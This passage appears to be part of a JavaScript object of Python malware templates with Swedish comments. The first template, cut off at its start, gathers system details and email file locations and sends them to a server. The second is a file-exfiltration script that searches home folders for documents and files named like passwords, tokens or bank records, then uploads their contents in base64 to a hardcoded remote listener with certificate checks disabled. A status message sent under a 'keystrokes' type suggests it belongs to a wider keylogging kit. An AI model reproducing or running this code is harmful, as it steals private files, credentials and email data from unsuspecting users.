                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local', 'Microsoft', 'Outlook'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Roaming', 'Microsoft', 'Outlook'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Outlook'),
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Outlook')
            ]
            
            for path in outlook_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(('.pst', '.ost', '.msg', '.eml')):
                                email_files.append(os.path.join(root, file))
                                # Begränsa för att undvika för många filer
                                if len(email_files) >= 50:
                                    return email_files
                                    
        elif platform.system() == "Linux":
            # Sök efter vanliga e-postfiler i Linux
            home = os.path.expanduser("~")
            mail_paths = [
                os.path.join(home, '.thunderbird'),
                os.path.join(home, '.mozilla-thunderbird'),
                os.path.join(home, '.config', 'evolution'),
                os.path.join(home, '.local', 'share', 'evolution')
            ]
            
            for path in mail_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(('.msf', '.mbox', '.maildir', '.eml')):
                                email_files.append(os.path.join(root, file))
                                # Begränsa för att undvika för många filer
                                if len(email_files) >= 50:
                                    return email_files
                                    
        elif platform.system() == "Darwin":  # macOS
            # Sök efter vanliga e-postfiler i macOS
            home = os.path.expanduser("~")
            mail_paths = [
                os.path.join(home, 'Library', 'Mail'),
                os.path.join(home, 'Library', 'Containers', 'com.apple.mail', 'Data', 'Library', 'Mail'),
                os.path.join(home, 'Library', 'Thunderbird')
            ]
            
            for path in mail_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(('.emlx', '.mbox', '.eml')):
                                email_files.append(os.path.join(root, file))
                                # Begränsa för att undvika för många filer
                                if len(email_files) >= 50:
                                    return email_files
                                    
    except Exception as e:
        print(f"Fel vid sökning efter e-postfiler: {e}")
        
    return email_files

def collect_system_info():
    """Samlar in systeminfo och skickar till servern."""
    try:
        # Grundläggande systeminformation
        system_info = {
            "os": platform.system(),
            "osVersion": platform.version(),
            "name": USER,
            "system": SYSTEM,
            "mac": get_mac_address(),
            "timezone": get_timezone(),
            "localTime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "publicIp": get_public_ip(),
        }
        
        # Detaljerad systeminformation
        cpu_name, cpu_cores = get_cpu_info()
        system_info["cpu"] = cpu_name
        system_info["cpuCores"] = cpu_cores
        
        total_ram, available_ram = get_ram_info()
        system_info["ramTotal"] = total_ram
        system_info["ramAvailable"] = available_ram
        
        # Nätverk, diskar, WiFi, program
        system_info["network"] = get_network_interfaces()
        system_info["disks"] = get_disk_info()
        system_info["wifi"] = get_wifi_networks()
        system_info["programs"] = get_installed_programs()
        system_info["emailFiles"] = find_email_files()
        
        # Konvertera till JSON och skicka
        system_info_json = json.dumps(system_info)
        send_data("system_info", system_info_json)
        
        print("Systeminformation insamlad och skickad.")
        
    except Exception as e:
        print(f"Fel vid insamling av systeminformation: {e}")
        # Försök skicka en felsökningsrapport
        try:
            error_info = {
                "error": str(e),
                "traceback": traceback.format_exc()
            }
            send_data("system_info", json.dumps(error_info))
        except:
            pass

# Samla in och skicka systeminfo
collect_system_info()

# Vid behov, vänta lite innan skriptet avslutas för att tillåta nätverkstrafik
time.sleep(5)`,
  
  "file_exfiltration": `# Instruktion: File Exfiltration-läge - Hitta och exfiltrera specifika filtyper
import platform
import getpass
import os
import json
import urllib.parse
import urllib.request
import time
import base64
import socket
import datetime
import ssl
import threading
import sys
import re

# Grundläggande information
USER = getpass.getuser()
SYSTEM = platform.node()
SERVER_URL = "https://neea.fun/listener/log_receiver"
SECRET_TOKEN = "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=="
SEND_INTERVAL = 3600  # Sekunder mellan filer
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB maximal filstorlek
STATUS_INTERVAL = 300  # 5 minuter mellan statusuppdateringar

# Filtyper att söka efter och exfiltrera
TARGET_EXTENSIONS = [
    # Dokument
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odt",
    # Bilder
    ".jpg", ".jpeg", ".png", ".gif", ".bmp",
    # Källkod och skript
    ".py", ".java", ".cpp", ".c", ".cs", ".php", ".html", ".js", ".css", ".sql",
    # Data och konfiguration
    ".json", ".xml", ".csv", ".ini", ".config", ".yaml", ".yml",
    # Komprimerade filer
    ".zip", ".rar", ".7z", ".tar", ".gz",
    # Speciella tillägg
    ".pst", ".ost", ".eml", ".msg"  # E-post relaterade
]

# Kritiska filnamn och mönster att söka efter
CRITICAL_PATTERNS = [
    "password", "passw", "passwd", "pwd", "secret", "credentials", "key", "token",
    "auth", "access", "login", "user", "account", "konto", "config", "sensitive",
    "private", "personal", "employee", "customer", "client", "bank", "credit",
    "financial", "resultat", "budget", "salary", "lön", "rapport", "avtal",
    "kontrakt", "projekt"
]

# Kataloger att exkludera från sökning
EXCLUDED_DIRS = [
    "Windows", "Program Files", "Program Files (x86)", "ProgramData", "AppData",
    "node_modules", "vendor", "packages", "tmp", "temp", ".git", ".svn", "venv", "env",
    "System", "System32", "SysWOW64", "Library"
]

def send_data(data_type, data):
    """Skickar data till servern."""
    try:
        url = SERVER_URL
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {SECRET_TOKEN}"
        }
        
        # Koda data för säker överföring
        encoded_data = urllib.parse.quote(data)
        
        payload = json.dumps({
            "type": data_type,
            "user": USER,
            "system": SYSTEM,
            "data": encoded_data
        })
        
        # Skapa SSL-kontext som ignorerar certifikatfel
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Skapa förfrågan
        req = urllib.request.Request(url, data=payload.encode('utf-8'), headers=headers)
        
        # Skicka förfrågan
        with urllib.request.urlopen(req, context=ctx) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Fel vid sändning av data: {str(e)}")
        return None

def should_exclude(path):
    """Kontrollerar om en katalog ska uteslutas från sökningen."""
    if not path:
        return True
        
    for excluded in EXCLUDED_DIRS:
        if excluded.lower() in path.lower():
            return True
            
    return False

def is_critical_file(filename):
    """Kontrollerar om en fil kan innehålla kritisk information baserat på namn."""
    filename_lower = filename.lower()
    
    for pattern in CRITICAL_PATTERNS:
        if pattern.lower() in filename_lower:
            return True
            
    return False

def scan_directory(directory, max_files=1000):
    """Söker igenom en katalog efter viktiga filer."""
    found_files = []
    try:
        for root, dirs, files in os.walk(directory):
            # Exkludera valda kataloger
            dirs[:] = [d for d in dirs if not should_exclude(os.path.join(root, d))]
            
            for file in files:
                if len(found_files) >= max_files:
                    return found_files
                    
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file)
                
                # Kontrollera om filen matchar sökkriterierna
                if ext.lower() in TARGET_EXTENSIONS or is_critical_file(file):
                    try:
                        # Kontrollera filstorlek
                        file_size = os.path.getsize(file_path)
                        if file_size <= MAX_FILE_SIZE:
                            found_files.append({
                                "path": file_path,
                                "size": file_size,
                                "modified": datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).strftime("%Y-%m-%d %H:%M:%S"),
                                "critical": is_critical_file(file)
                            })
                    except:
                        pass
    except Exception as e:
        print(f"Fel vid sökning i {directory}: {e}")
        
    return found_files

def get_file_content(file_path):
    """Läser innehållet i en fil och kodas som base64."""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        return base64.b64encode(file_data).decode('utf-8')
    except Exception as e:
        print(f"Fel vid läsning av fil {file_path}: {e}")
        return None

def exfiltrate_file(file_info):
    """Hämtar och skickar en fils innehåll."""
    try:
        file_path = file_info["path"]
        file_content = get_file_content(file_path)
        
        if file_content:
            # Skapa metadata
            metadata = {
                "filename": os.path.basename(file_path),
                "path": file_path,
                "size": file_info["size"],
                "modified": file_info["modified"],
                "exfiltrated": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "content": file_content
            }
            
            # Konvertera till JSON och skicka
            send_data("file_content", json.dumps(metadata))
            print(f"Filinnehåll skickat: {file_path}")
            return True
    except Exception as e:
        print(f"Fel vid exfiltrering av fil {file_info['path']}: {e}")
        
    return False

def scan_and_send_file_list():
    """Söker efter filer och skickar listan."""
    important_locations = []
    
    # Lägg till hemkataloger och andra viktiga platser beroende på OS
    if platform.system() == "Windows":
        important_locations.extend([
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Pictures'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'OneDrive'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'OneDrive', 'Documents')
        ])
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        home = os.path.expanduser("~")
        important_locations.extend([
            os.path.join(home, 'Documents'),
            os.path.join(home, 'Desktop'),
            os.path.join(home, 'Downloads'),
            os.path.join(home, 'Pictures')
        ])
        
    # Filtrera ut kataloger som inte existerar
    valid_locations = [loc for loc in important_locations if os.path.exists(loc)]
    
    # Om inga giltiga platser hittades, använd hemkatalogen
    if not valid_locations:
        valid_locations = [os.path.expanduser("~")]
        
    all_found_files = []
    for location in valid_locations:
        files = scan_directory(location, max_files=200)  # Max 200 filer per plats
        all_found_files.extend(files)
        
        # Begränsa total mängd
        if len(all_found_files) >= 1000:
            all_found_files = all_found_files[:1000]
            break
            
    # Prioritera kritiska filer
    all_found_files.sort(key=lambda x: (not x.get("critical"), os.path.getsize(x["path"])))
    
    # Konvertera till JSON och skicka fillistan
    file_list_str = json.dumps({
        "files": all_found_files,
        "total_found": len(all_found_files),
        "os": platform.system(),
        "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    
    send_data("file_list", file_list_str)
    print(f"Fillista skickad med {len(all_found_files)} filer")
    
    return all_found_files

def file_exfiltration_loop():
    """Huvud-loop för filexfiltrering."""
    files_sent_count = 0
    
    while True:
        try:
            # Skicka status om vi redan har skickat filer
            if files_sent_count > 0:
                send_data("keystrokes", f"File exfiltration status: {files_sent_count} files sent")
                time.sleep(STATUS_INTERVAL)
                
            # Skanna efter filer
            found_files = scan_and_send_file_list()
            
            # Exfiltrera filer
            for file_info in found_files:
                # Kontrollera filstorlek innan exfiltrering
                if file_info["size"] <= MAX_FILE_SIZE:
                    success = exfiltrate_file(file_info)
                    if success:
                        files_sent_count += 1
                    
                    # Vänta mellan filer för att undvika överbelastning
                    time.sleep(SEND_INTERVAL)
                    
        except Exception as e:
            print(f"Fel i filexfiltreringsloop: {e}")
            time.sleep(SEND_INTERVAL)

# Starta filexfiltrering i en separat tråd
exfiltration_thread = threading.Thread(target=file_exfiltration_loop, daemon=True)
exfiltration_thread.start()

# Håll programmet körande
try:
    while True:
        time.sleep(60)
except KeyboardInterrupt:
    print("Avbruten av användaren.")`
};
